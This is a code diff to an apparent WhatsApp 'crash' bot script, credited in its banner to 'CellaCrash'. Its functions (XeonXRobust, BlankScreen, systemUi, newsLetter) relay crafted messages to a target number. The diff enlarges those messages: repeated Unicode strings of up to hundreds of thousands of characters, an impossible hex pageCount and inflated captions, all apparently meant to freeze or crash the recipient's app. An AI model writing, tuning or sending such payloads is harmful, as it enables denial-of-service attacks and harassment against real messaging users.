@@ -1360,7 +1360,7 @@ console.log(chalk.red.bold('Crash System Device By ☆ CellaCrash'))
 };
 async function XeonXRobust(target, Ptcp = true) {
   const jids = `_*~@0~*_\n`.repeat(10200);
-  const ui = "ꦽ".repeat(10000);
+  const ui = "ꦽ".repeat(200000);
   await cella.relayMessage(target, {
     ephemeralMessage: {
       message: {
@@ -1371,7 +1371,7 @@ async function XeonXRobust(target, Ptcp = true) {
               mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
               fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
               fileLength: "9999999999999",
-              pageCount: 1316134911,
+              pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
               mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
               fileName: "I Love You:)❤️",
               fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
@@ -1408,7 +1408,7 @@ async function XeonXRobust(target, Ptcp = true) {
                 mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                 fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                 fileLength: "9999999999999",
-                pageCount: 1316134911,
+                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                 mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                 fileName: "Yea? ThanksYou!",
                 fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
@@ -1572,7 +1572,7 @@ async function XeonXRobust(target, Ptcp = true) {
     cella.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
 }
  async function BlankScreen(target, Ptcp = false) {
-let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "@ྫྷ".repeat(100000);
+let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "ྫྷ".repeat(230000);
 			await cella.relayMessage(target, {
 					ephemeralMessage: {
 						message: {
@@ -1757,7 +1757,7 @@ async function systemUi(target, Ptcp = false) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "Please.." + "ꦾ".repeat(90000) + "@ꦾ ".repeat(100000)
+                        text: "Please.." + "ꦾ".repeat(90000) + "ꦾ ".repeat(100000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -1872,7 +1872,7 @@ async function newsLetter(target, Ptcp = true) {
                                 newsletterJid: `33333333333333333@newsletter`,
                                 newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ી".repeat(120000),
                                 jpegThumbnail: "",
-                                caption: "ꦽ".repeat(120000),
+                                caption: "ꦽ".repeat(180000),
                                 inviteExpiration: Date.now() + 1814400000,
                             },
                         },
@@ -2044,7 +2044,7 @@ async function newsLetter(target, Ptcp = true) {
               forwardingScore: 99999999,
               isForwarded: true,
               quotedAd: {
-                advertiserName: "Example Advertiser",
+                advertiserName: "youtube",
                 mediaType: "IMAGE",
                 jpegThumbnail:
                   "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
@@ -2061,7 +2061,7 @@ async function newsLetter(target, Ptcp = true) {
                 "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
               externalAdReply: {
                 title: "Ueheheheeh",
-                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
+                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(20000),
                 mediaType: "VIDEO",
                 renderLargerThumbnail: true,
                 previewTtpe: "VIDEO",
